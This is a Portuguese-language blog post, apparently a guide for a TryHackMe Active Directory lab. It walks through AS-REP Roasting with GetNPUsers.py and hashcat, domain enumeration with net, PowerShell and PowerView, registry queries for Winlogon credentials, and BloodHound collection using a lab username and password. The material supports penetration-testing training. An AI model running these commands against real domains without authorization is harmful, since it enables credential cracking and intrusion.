---
layout: post
title: "AD Authenticated Enumeration - AS-REP, PowerShell e BloodHound"
description: "Guia curto de enumeração Active Directory, AS-REP Roasting, comandos nativos Windows, PowerView e BloodHound em laboratório TryHackMe."
date: 2026-10-19
categories: [guia, pentest, windows, tryhackme]
tags: [active-directory, kerberos, as-rep-roasting, impacket, hashcat, powershell, powerview, bloodhound, enumeration]
---

# AD Authenticated Enumeration - Guia prático

> Material de laboratório TryHackMe. AS-REP Roasting, especificamente, pode ser iniciado sem autenticação, apesar do nome da room.

**Ambiente:** domínio `tryhackme.loc`, DC `10.211.12.10`, workstation `10.211.12.20`, usuário `asrepuser1`.

## 1. AS-REP Roasting

Quando a conta não exige pré-autenticação Kerberos (`UF_DONT_REQUIRE_PREAUTH`), é possível solicitar um AS-REP e testar senhas offline.

### 1.1 Preparar usuários (Linux)

~~~bash
cat > users.txt
# Colar um usuário por linha e pressionar Ctrl+D
sort -u -o users.txt users.txt
~~~

`cat >` cria o arquivo com conteúdo digitado; `sort -u -o` remove nomes duplicados e salva no próprio arquivo. Não usar `sort -u users.txt > users.txt`, pois o redirecionamento trunca o arquivo antes da leitura.

### 1.2 Coletar hashes

~~~bash
GetNPUsers.py tryhackme.loc/ -dc-ip 10.211.12.10 -usersfile users.txt -format hashcat -outputfile hashes.txt -no-pass
~~~

- `-dc-ip`: endereço do Domain Controller.
- `-usersfile`: lista de contas candidatas.
- `-format hashcat`: formato de saída.
- `-outputfile`: arquivo que recebe os AS-REP.
- `-no-pass`: não solicitar senha.

**Interpretação:** `doesn't have UF_DONT_REQUIRE_PREAUTH set` significa que a conta exige pré-autenticação; `KDC_ERR_CLIENT_REVOKED` pode indicar conta bloqueada, desabilitada ou revogada; `$krb5asrep$23$` indica dados AS-REP coletados para o modo 18200.

No Windows, o equivalente da room é `Rubeus.exe asreproast`.

### 1.3 Testar senhas offline

~~~bash
hashcat -m 18200 hashes.txt /usr/share/wordlists/rockyou.txt
hashcat -m 18200 hashes.txt --show
~~~

`-m 18200` indica Kerberos AS-REP etype 23; `--show` exibe os resultados já recuperados. O Hashcat testa candidatos de senha, não descriptografa diretamente a senha.

## 2. Enumeração autenticada com CMD

~~~bash
ssh asrepuser1@10.211.12.20
~~~

Na workstation Windows:

| Comando | Finalidade |
|---|---|
| `whoami /all` | SID, grupos e privilégios do usuário |
| `hostname` | Nome do computador |
| `systeminfo` | SO e configuração do domínio |
| `set` | Variáveis de ambiente |
| `net user` | Usuários locais |
| `net user /domain` | Usuários do domínio |
| `net user rduke /domain` | Detalhes de uma conta |
| `net group /domain` | Grupos do domínio |
| `net group "Domain Admins" /domain` | Membros privilegiados |
| `net localgroup administrators` | Administradores locais |
| `quser` | Sessões interativas |

Priorizar a revisão de `SeImpersonatePrivilege`, `SeBackupPrivilege`, `SeRestorePrivilege`, `SeDebugPrivilege` e `SeAssignPrimaryTokenPrivilege`. Um privilégio presente não garante exploração.

### Serviços, tarefas e Registro

~~~cmd
wmic service get Name,StartName
sc query state= all
sc qc DHCP
schtasks /query /fo LIST /v
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall
~~~

`StartName`/`SERVICE_START_NAME` revela a identidade usada pelo serviço, como `LocalSystem`, `LocalService` ou uma conta de domínio. Algumas consultas exigem privilégios elevados.

## 3. PowerShell ActiveDirectory e PowerView

~~~powershell
Get-Module -ListAvailable ActiveDirectory
Import-Module ActiveDirectory
Get-ADUser -Filter *
Get-ADUser -Identity rduke -Properties *
Get-ADGroup -Filter *
Get-ADGroupMember -Identity "Domain Admins"
Get-ADComputer -Filter * | Select-Object Name,OperatingSystem
Get-ADDefaultDomainPasswordPolicy
~~~

O módulo ActiveDirectory costuma estar disponível em DCs ou em máquinas com RSAT.

**PowerView** (quando já presente no laboratório):

~~~powershell
Import-Module .\PowerView.ps1
Get-DomainUser
Get-DomainUser *admin*
Get-DomainGroup "*admin*"
Get-DomainComputer
Get-DomainUser -SPN
~~~

`-SPN` lista contas com Service Principal Name, relevantes à investigação de Kerberoasting.

## 4. BloodHound

BloodHound representa usuários, grupos e computadores como **nodes** e relações/permissões como **edges**, ajudando a visualizar caminhos de escalonamento.

Coleta no Linux:

~~~bash
bloodhound-python -u asrepuser1 -p 'qwerty123!' -d tryhackme.loc -ns 10.211.12.10 -c All --zip
~~~

- `-u/-p`: credenciais; `-d`: domínio; `-ns`: servidor DNS.
- `-c All`: todos os métodos disponíveis; `--zip`: saída compactada para importação.

Alternativa Windows:

~~~cmd
.\SharpHound.exe --CollectionMethods All --Domain tryhackme.loc --ExcludeDCs
~~~

No BloodHound-CE da room (`http://10.211.12.100:8080`): **Administration → File Ingest** para importar o ZIP; **Explore** para visualizar objetos; **Cypher** para consultas prontas, como All Domain Admins; **Pathfinding** para analisar relações entre conta inicial e grupo-alvo.

Coletas amplas podem gerar alertas em AV/EDR. Adequar o escopo à autorização.

## 5. Checklist

- [ ] Identificar domínio, DC, máquina e usuário atual.
- [ ] Enumerar contas e grupos locais e do AD.
- [ ] Analisar privilégios e sessões logadas.
- [ ] Verificar serviços, tarefas e Registro.
- [ ] Consultar política de senhas e pré-autenticação Kerberos.
- [ ] Testar AS-REP Roasting apenas no laboratório.
- [ ] Coletar e analisar relações com BloodHound.
- [ ] Registrar achados e permissões relevantes.

**Defesas:** manter pré-autenticação Kerberos ativada, utilizar senhas fortes, aplicar privilégio mínimo e monitorar AS-REQ/AS-REP suspeitos no DC.
